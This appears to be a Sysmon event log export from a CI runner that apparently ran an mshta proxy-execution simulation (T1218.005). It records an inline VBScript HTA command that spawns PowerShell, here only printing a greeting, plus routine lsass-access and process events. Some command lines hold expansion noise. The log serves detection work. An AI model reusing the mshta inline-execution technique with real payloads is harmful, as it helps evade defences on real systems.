"12/17/2025 8:04:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:32.673
ProcessGuid: {f995aebf-6410-6942-a706-000000000e00}
ProcessId: 7060
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:32.414
ProcessGuid: {f995aebf-6410-6942-a606-000000000e00}
ProcessId: 4404
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:27 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:04:27.642
ProcessGuid: {f995aebf-5ae5-6942-d600-000000000e00}
ProcessId: 7596
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotiT1218.005.hta
Details: DWORD (0x00000004)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:27.382
ProcessGuid: {f995aebf-640a-6942-9f06-000000000e00}
ProcessId: 4796
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zb4errem.bqi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:27.354
ProcessGuid: {f995aebf-640a-6942-9f06-000000000e00}
ProcessId: 4796
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zb4errem.bqi.ps1
CreationUtcTime: 2025-12-17 08:04:27.354
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:27 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:27.067
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:27 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:27.067
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:27 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:27.007
SourceProcessGUID: {f995aebf-6080-6942-d802-000000000e00}
SourceProcessId: 10068
SourceThreadId: 6028
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|C:\Windows\System32\perfts.dll+5d37|C:\Windows\System32\perfts.dll+7cb4|C:\Windows\System32\advapi32.dll+3e990|C:\Windows\System32\advapi32.dll+23e7|C:\Windows\System32\advapi32.dll+1d27|C:\Windows\System32\advapi32.dll+2dd43|C:\Windows\System32\advapi32.dll+2d15b|C:\Windows\System32\KERNELBASE.dll+2db1b|C:\Windows\System32\KERNELBASE.dll+2badb|C:\Windows\SYSTEM32\pdh.dll+61c1|C:\Windows\SYSTEM32\pdh.dll+885f|C:\Windows\SYSTEM32\pdh.dll+737e|C:\Windows\SYSTEM32\pdh.dll+45de|C:\Windows\SYSTEM32\pdh.dll+353f|C:\Windows\SYSTEM32\pdh.dll+1790|C:\Windows\System32\wbem\WmiPerfClass.dll+cac8|C:\Windows\System32\wbem\WmiPerfClass.dll+89be|C:\Windows\System32\wbem\WmiPerfClass.dll+8680|C:\Windows\System32\wbem\WmiPerfClass.dll+84ca|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.993
SourceProcessGUID: {f995aebf-6080-6942-d802-000000000e00}
SourceProcessId: 10068
SourceThreadId: 6028
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\WINSTA.dll+3532|C:\Windows\System32\WINSTA.dll+3360|C:\Windows\System32\WINSTA.dll+2de9|C:\Windows\SYSTEM32\WTSAPI32.dll+1d83|C:\Windows\System32\perfts.dll+7c86|C:\Windows\System32\advapi32.dll+3e990|C:\Windows\System32\advapi32.dll+23e7|C:\Windows\System32\advapi32.dll+1d27|C:\Windows\System32\advapi32.dll+2dd43|C:\Windows\System32\advapi32.dll+2d15b|C:\Windows\System32\KERNELBASE.dll+2db1b|C:\Windows\System32\KERNELBASE.dll+2badb|C:\Windows\SYSTEM32\pdh.dll+61c1|C:\Windows\SYSTEM32\pdh.dll+885f|C:\Windows\SYSTEM32\pdh.dll+737e|C:\Windows\SYSTEM32\pdh.dll+45de|C:\Windows\SYSTEM32\pdh.dll+353f|C:\Windows\SYSTEM32\pdh.dll+1790|C:\Windows\System32\wbem\WmiPerfClass.dll+cac8|C:\Windows\System32\wbem\WmiPerfClass.dll+89be|C:\Windows\System32\wbem\WmiPerfClass.dll+8680|C:\Windows\System32\wbem\WmiPerfClass.dll+84ca|C:\Windows\System32\KERNEL32.DLL+2e8d7
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:26.962
ProcessGuid: {f995aebf-640a-6942-a206-000000000e00}
ProcessId: 7748
Image: C:\Windows\System32\svchost.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.917
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.917
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.917
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.917
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.776
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.776
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:26.685
ProcessGuid: {f995aebf-640a-6942-9f06-000000000e00}
ProcessId: 4796
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host Hello, MSHTA!;Start-Sleep -Seconds 5
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-640a-6942-9e06-000000000e00}
ParentProcessId: 6352
ParentImage: C:\Windows\System32\mshta.exe
ParentCommandLine: mshta.exe  ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run6352""""powershell.exe6352-nop6352-Command6352Write-Host6352Hello,6352MSHTA!;Start-Sleep6352-Seconds%205""""""))</script>'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:26 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:26.516
ProcessGuid: {f995aebf-640a-6942-9e06-000000000e00}
ProcessId: 6352
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta.exe  ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").RunThe system cannot find the device specified. """"powershell.exeThe system cannot find the device specified. -nopThe system cannot find the device specified. -CommandThe system cannot find the device specified. Write-HostThe system cannot find the device specified. Hello,The system cannot find the device specified. MSHTA!;Start-SleepThe system cannot find the device specified. -SecondsNo process in the command subtree has a signal handler. """"""))</script>'""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-640a-6942-9c06-000000000e00}
ParentProcessId: 2000
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run2000""""powershell.exe2000-nop2000-Command2000Write-Host2000Hello,2000MSHTA!;Start-Sleep2000-Seconds%205""""""))</script>'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:26 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:26.489
ProcessGuid: {f995aebf-640a-6942-9c06-000000000e00}
ProcessId: 2000
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").RunThe system cannot find the device specified. """"powershell.exeThe system cannot find the device specified. -nopThe system cannot find the device specified. -CommandThe system cannot find the device specified. Write-HostThe system cannot find the device specified. Hello,The system cannot find the device specified. MSHTA!;Start-SleepThe system cannot find the device specified. -SecondsNo process in the command subtree has a signal handler. """"""))</script>'""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.047
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:26 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:26.047
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:25 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:25.996
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:25 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:25.996
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
